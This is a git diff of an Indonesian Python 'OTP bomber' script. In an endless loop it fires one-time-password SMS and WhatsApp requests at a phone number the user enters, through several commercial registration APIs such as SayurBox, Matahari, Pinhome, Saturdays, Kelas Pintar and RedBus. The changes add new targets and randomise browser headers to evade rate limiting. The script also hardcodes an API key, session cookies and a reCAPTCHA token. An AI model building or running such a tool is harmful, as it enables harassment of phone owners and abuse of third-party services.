@@ -52,6 +52,9 @@ nomor_matahari = inputNomer.replace("+62", "0")
 nomor_mraladin = inputNomer.replace("+62", "")
 nomor_pinhome = inputNomer.replace("+62", "")
 nomor_saturdays = inputNomer.replace("+62", "")
+nomor_redbus = inputNomer.replace("+62", "")
+nomor_saturdays = inputNomer.replace("+62", "")
+nomor_pinhome = inputNomer.replace("+62", "")
 # Loop to send OTP requests
 while True:
     user_agent = generate_user_agent()
@@ -87,12 +90,12 @@ while True:
             },
             "query": "mutation generateOTP($destinationType:String!$identity:String!){generateOTP(destinationType:$destinationType identity:$identity){id __typename}}"
         })
-        response_danacita_whatsapp = requests.post("https://www.sayurbox.com/graphql/v1", headers=headers_sayurbox, data=data_whatsapp_sayurbox)
-        if response_danacita_whatsapp.status_code == 200:
-            result = response_danacita_whatsapp.json()
-            print(f"{hijau}Berhasil mengirim Whatsapp via SayurBox {result}")
+        response_sayurbox_wa = requests.post("https://www.sayurbox.com/graphql/v1", headers=headers_sayurbox, data=data_whatsapp_sayurbox)
+        if response_sayurbox_wa.status_code == 200:
+            result = response_sayurbox_wa.json()
+            print(f"{hijau}Berhasil mengirim Whatsapp via SayurBox {response_sayurbox_wa.status_code}: {response_sayurbox_wa.text}")
         else:
-            print(f"{R}Gagal mengirim Whatsapp via SayurBox {response_danacita_whatsapp.status_code}: {response_danacita_whatsapp.text}")
+            print(f"{R}Gagal mengirim Whatsapp via SayurBox {response_sayurbox_wa.status_code}: {response_sayurbox_wa.text}")
 
 # Function to send SMS request
     def send_sms_request(phone_number):
@@ -104,12 +107,11 @@ while True:
             },
             "query": "mutation generateOTP($destinationType:String!$identity:String!){generateOTP(destinationType:$destinationType identity:$identity){id __typename}}"
         })
-        response_danacita_sms = requests.post("https://www.sayurbox.com/graphql/v1", headers=headers_sayurbox, data=data_sms_sayurbox)
-        if response_danacita_sms.status_code == 200:
-            result = response_danacita_sms.json()
-            print(f"{hijau}Berhasil mengirim SMS via SayurBox {result}")
+        response_sayurbox_sms = requests.post("https://www.sayurbox.com/graphql/v1", headers=headers_sayurbox, data=data_sms_sayurbox)
+        if response_sayurbox_sms.status_code == 200:
+            print(f"{hijau}Berhasil mengirim SMS via SayurBox {response_sayurbox_sms.status_code}: {response_sayurbox_sms.text}")
         else:
-            print(f"{R}Gagal mengirim SMS via SayurBox {response_danacita_sms.status_code}: {response_danacita_sms.status_code}")
+            print(f"{R}Gagal mengirim SMS via SayurBox {response_sayurbox_sms.status_code}: {response_sayurbox_sms.status_code}")
         
     send_sms_request(inputNomer)
     send_whatsapp_request(inputNomer)
@@ -142,9 +144,7 @@ while True:
     response_matahari = requests.post("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp", headers=headers_matahari, data=data_matahari)
     if response_matahari.status_code == 200:
         response_data = response_matahari.json()
-        outcome_code = response_data.get("outcome_code")
-        outcome_message = response_data.get("outcome_message")
-        print(f"{hijau}Berhasil mengirim SMS/WA via Matahari {outcome_code}: {outcome_message}")
+        print(f"{hijau}Berhasil mengirim SMS/WA via Matahari {response_matahari.status_code}: {response_matahari.text}")
     else:
         print(f"{R}Gagal mengirim SMS/WA via Matahari {response_matahari.status_code}: {response_matahari.text}")
 
@@ -174,8 +174,7 @@ while True:
     response_danacita = requests.post("https://api.danacita.co.id/v4/users/mobile_register/", headers=headers_danacita, data=data_danacita)
     if response_danacita.status_code == 200:
         response_data = response_danacita.json()
-        detail = response_data.get("detail")
-        print(f"{hijau}Berhasil mengirim SMS/WA via Danacita {detail}")
+        print(f"{hijau}Berhasil mengirim SMS/WA via Danacita {response_danacita.status_code}: {response_danacita.text}")
     else:
         print(f"{R}Gagal mengirim SMS/WA via Danacita {response_danacita.status_code}: {response_danacita.text}")
         
@@ -209,21 +208,7 @@ while True:
     response_mraladin = requests.post("https://www.misteraladin.com/api/members/v2/otp/request", headers=headers_misterAladin, data=data_misterAladin)
     if response_mraladin.status_code == 200:
         response_data = response_mraladin.json()
-    
-        data = response_data.get("data", {})
-        print("ID:", data.get("id"))
-        print("Member ID:", data.get("member_id"))
-        print("Phone Number Country Code:", data.get("phone_number_country_code"))
-        print("Phone Number:", data.get("phone_number"))
-        print("Type:", data.get("type"))
-        print("OTP Index:", data.get("otp_index"))
-        print("Expired At:", data.get("expired_at"))
-        print("Expire In Timestamp:", data.get("expire_in_timestamp"))
-        print("Blocked End:", data.get("blocked_end"))
-        print("Next Interval:", data.get("next_interval"))
-        print("Created At:", data.get("created_at"))
-        print("Updated At:", data.get("updated_at"))
-        print(f"{hijau}Berhasil mengirim SMS/WA via Mister Aladin")
+        print(f"{hijau}Berhasil mengirim SMS/WA via Mister Aladin {response_mraladin.status_code} {response_mraladin.text}")
     else: 
         print(f"{R}Gagal mengirim SMS/WA via Mister Aladin {response_mraladin.status_code} {response_mraladin.text}")
 
@@ -254,15 +239,14 @@ while True:
         "countryCode": "62",
         "medium": "whatsapp",
         "otpType": "register",
-        "phoneNumber": "81281524356"
+        "phoneNumber": nomor_pinhome
     })
     
     response_pinhome = requests.post("https://www.pinhome.id/api/pinaccount/request/otp", headers=headers_pinhome, data=data_pinhome)
     if response_pinhome.status_code == 201:
         response_data = response_pinhome.json()
     
-        print("Secret Code:", response_data.get("secretCode"))
-        print(f"{hijau}Berhasil mengirim SMS/WA via Pinhome")
+        print(f"{hijau}Berhasil mengirim SMS/WA via Pinhome {response_pinhome.status_code} {response_pinhome.text}")
     else:
         print(f"{R}Gagal mengirim SMS/WA via Pinhome {response_pinhome.status_code} {response_pinhome.text}")
         
@@ -270,10 +254,10 @@ while True:
     headers_saturdays = {
         "Accept": "*/*",
         "Accept-Encoding": "gzip, deflate, br, zstd",
-        "Accept-Language": "en",
+        "Accept-Language": generate_accept_language(),
         "Authorization": "undefined", 
         "Connection": "keep-alive",
-        "Content-Length": "55",
+        "Content-Length": str(random.randint(20, 50)),
         "Content-Type": "application/json",
         "Country-Code": "ID",
         "Currency-Code": "IDR",
@@ -282,30 +266,90 @@ while True:
         "Origin": "https://saturdays.com",
         "Platform": "dweb",
         "Referer": "https://saturdays.com/",
-        "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
-        "Sec-Ch-Ua-Mobile": "?0",
-        "Sec-Ch-Ua-Platform": "\"Windows\"",
-        "Sec-Fetch-Dest": "empty",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Site": "same-site",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Sec-Ch-Ua": generate_sec_ch_ua(),
+        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
+        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
+        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
+        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
+        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
+        "User-Agent": generate_user_agent(),
         "X-Api-Key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj"
     }
 
     data_saturdays = json.dumps({
-        "number": "81281524356",
+        "number": nomor_saturdays,
         "countryCode": "+62",
-        "type": ""
+        "type": "MSG"
     })
     
     response_saturdays = requests.post("https://beta.api.saturdays.com/api/v1/user/otp/send", headers=headers_saturdays, data=data_saturdays)
     if response_saturdays.status_code == 200:
         response_data = response_saturdays.json()
-    
-        print("Status:", response_data.get("status"))
-        print("Data:", response_data.get("data"))
-        print("Message (EN):", response_data.get("message").get("en"))
-        print("Message (ID):", response_data.get("message").get("id"))
-        print(f"{hijau}Berhasil mengirim SMS/WA via Saturdays")
+        print(f"{hijau}Berhasil mengirim SMS/WA via Saturdays {response_saturdays.status_code} {response_saturdays.text}")
     else:
         print(f"{R}Gagal mengirim SMS/WA via Saturdays {response_saturdays.status_code} {response_saturdays.text}")
+  
+    headers_kelaspintar = {
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Accept-Language": "en",
+        "Authorization": "Bearer undefined",
+        "Content-Length": "29",
+        "Content-Type": "application/json",
+        "Origin": "https://www.kelaspintar.id",
+        "Priority": "u=1, i",
+        "Referer": "https://www.kelaspintar.id/",
+        "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Sec-Ch-Ua-Platform": '"Windows"',
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-site",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+    }
+    
+    data_kelaspintar = json.dumps({
+        "phone_number": inputNomer,
+    })
+    
+    response_kelaspintar = requests.post("https://api.kelaspintar.id/uaa/v1/auth/check/phone_number", headers=headers_kelaspintar, data=data_kelaspintar)
+    if response_kelaspintar.status_code == 200:
+        response_data = response_kelaspintar.json()
+        print(f"{hijau}Berhasil mengirim SMS/WA via Kelas Pintar {response_kelaspintar.status_code} {response_kelaspintar.text}")
+    else:
+        print(f"{R}Gagal mengirim SMS/WA via Kelas Pintar {response_kelaspintar.status_code} {response_kelaspintar.text}")
+        
+    headers_redbus = {
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Accept-Language": "en,id-ID;q=0.9,id;q=0.8,en-US;q=0.7,es;q=0.6,zh-CN;q=0.5,zh;q=0.4,ms;q=0.3,ca;q=0.2,pt;q=0.1",
+        "Content-Length": "867",
+        "Content-Type": "application/json",
+        "Cookie": "perf_dv6Tr4n=1; mriClientId=WD0f625f09-46a3-43dd-9622-428095c43159; GEOLS=Jakarta; GEOLC=Jakarta; GEOLCO=ID; GEORAD=20; bft=1; jfpj=42de6cd875dc35550a13d168939e1fd5; _ga=GA1.1.1141212957.1719150729; _gcl_au=1.1.273472393.1719150729; rb_fpData=%7B%22browserName%22%3A%22Chrome%22%2C%22browserVersion%22%3A%22126.0.0.0%22%2C%22os%22%3A%22Windows%22%2C%22osVersion%22%3A%2210%22%2C%22screenSize%22%3A%221536%2C912%22%2C%22screenDPI%22%3A1.125%2C%22screenResolution%22%3A%221728x1080%22%2C%22screenColorDepth%22%3A24%2C%22aspectRatio%22%3A%228%3A5%22%2C%22systemLanguage%22%3A%22en%22%2C%22connection%22%3A%224g%22%2C%22userAgent%22%3A%22mozilla/5.0%20%28windows%20nt%2010.0%3B%20win64%3B%20x64%29%20applewebkit/537.36%20%28khtml%2C%20like%20gecko%29%20chrome/126.0.0.0%20safari/537.36%7CWin32%7Cen%22%2C%22timeZone%22%3A7%7D; rskxRunCookie=0; rCookie=twii0beap3p2lv9da9pya3lxrlyhhf; country=IDN; currency=IDR; selectedCurrency=IDR; language=id; defaultlanguage=id; reqOrigin=SG; mriSessionId=WD7fcc1a2e-c7b8-44de-bf9c-c6baedda77cc; defaultCountry=IDN; deviceSessionId=b30dda51-7391-4e46-b823-02ae2b7bc9e5; lzFlag=1; moe_uuid=9057ed46-e13a-49ad-9013-5657634305ba; ak_bmsc=CD76B77185D0D3EE9B8FEF834C7C7ADE~000000000000000000000000000000~YAAQvuwZuKoKsDiQAQAA8Jt3RxiSDlck5LO9RwT5NJkRahj9qHwQfTyqG5x5NY7MmvwjeMXDkLIc8PR9TnLA+xPhxKTwVx4OTjMkzgyGC1sWsL7IUHgIzlKtuRhNCqj+xvhozA2C0urcMFVnVgsePANMCd+ke3eCNorIoTIPC15rEYfdraoTz4ybYMCsjXTlsI+K4a5Gb73BGQ8lDH9sF/YlEhoYSgGWAEZrPB5wTdBBW26ItRznRiu+/kg+9+L1uAaGDatPAR/AoLZB2nkWXEsfZhLIBiuhPT9516RTnZVDs7VsQ4CZBw6UT7BGRWQPfZMWe7MBHCl83nqh/x/xv7SSWDhK7aHWQ7OVNR5Rk/GrmzwaV2EXj4PcjvxCucteEqbUtrM+5f+Jnu9e6RWPp0lm+bGeO9uj4X2yfo95YuxNqu4DkJb3SDPhEHBgJ7rWT1kCS8ImUwR4; isBrowserFP=true; lastRskxRun=1719185915964; mriClientIdSetDate=Mon Jun 24 2024 06:47:46 GMT+0700 (Western Indonesia Time); bm_sv=3F9CE2C1559DB2C6AE4677D8A6A50039~YAAQvuwZuKyEsDiQAQAA+HGARxjQObU4Kep7EgrKuXizwQ75cSyDv8mTWWN+MFfjVC5439NoFmu8ojFQbERo4GVjHGv6f/zeAi9fBQs+cPVTjzZLtI+R8gmG/LuNaAVMzVbRE9xfsEmRBQDz5swjmmwzBgE5fuHbL9AH5+2eGSSixMZkcUzg6/Dc7fr19kDuWT2gr1pfG2bnZ5j/A+KFfFPZSQ/ABK+2AhLPlM3C7psrOxBfaB4ASNOnKKDZQgk=~1; _VTok=404977245971; _ga_1SE754V89Y=GS1.1.1719185914.3.1.1719186512.14.0.503742489",
+        "Origin": "https://www.redbus.id",
+        "Priority": "u=1, i",
+        "Referer": "https://www.redbus.id/account?pageName=Home&noReload=noReload",
+        "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Sec-Ch-Ua-Platform": '"Windows"',
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "X-Requested-With": "XMLHttpRequest"
+    }
+    
+    data_redbus = json.dumps({
+        "mobileNo": nomor_redbus,
+        "phoneCode": "62",
+        "Source": "SIGNIN",
+        "reCaptchaResponse": "03AFcWeA6i18Ptv9I8jtTUxeh8yXsNN8IOYBUyVC-IxP6JE2lSSjyxMXhbcIUaIOJw-YDHe-0zAvkj9dwfVSTnCW8yZGCNtZwLzlNjEUB1HyNcNnVdxugbDxXXZDQxxgEYe3vwLuywUyIsRsJsrU5LxcpwzruWG-1_nT7xoMpUYXEoRHzOU0jmsHaDOgR-MONHwvCXwTx6y04nzSfbhd65sZplx3X2Ai7-V6bjzpuky3lBWVOUKSgygdwAq04uSGyVJUeGVTPmv02Sj6Q1mv6KpGzq4GUxwEikSdsrrGZmMYYJPN3DVHZFf0hWT5hDDUX7AE2t2b5zYYmL2_gHV0i44LEqP2t7fd6ueXfRD32eoKlFHUITTkhNXQ7reXLt3XJwU5EqK4Brg6-xleyzHMAzNatNJ19ZGNRnafZEa8BFXbll3wzOXGrrgq5bmuhfTPk6VhXoxgD-xO_QXdTJlG-TpdUBoq4NLkmY7uLULqKHMG3lewGecSfTuACSFsftb6vazdzjQzECRc0r0uhqRUF27Tukh0Z0PBKmDedm_zIvGv7wwvIlp_lrGiT7lxV4DwLhDYtD1-sgIhurwVxUWH9h7_izNmlBOKGYF0gEUlQqgg0CHiAEONyBGMoa-z9KXvrow-j7caP1hkpMOeeLCWdOIKlUEugJsBb9DzTOLGmfZ-Ao_1mJf9g8b0z7mpfEme7a49J4qZw6PsfhsDXMqyYM8yWR68p9WkM2me6abHpqsMOfIO93kZ38Xw4",
+        "Token": "404977245971"
+    })
+    
+    response_redbusid = requests.post("https://www.redbus.id/Personalization/SendOTPV2", headers=headers_redbus, data=data_redbus)
+    if response_redbusid.status_code == 200:
+        print(f"{G}Berhasil mengirim OTP via Dekoruma {response_redbusid.status_code} {response_redbusid.text}")
+    else:
+        print(f"{R}Gagal mengirim OTP via Dekoruma {response_redbusid.status_code} {response_redbusid.text}")
+        
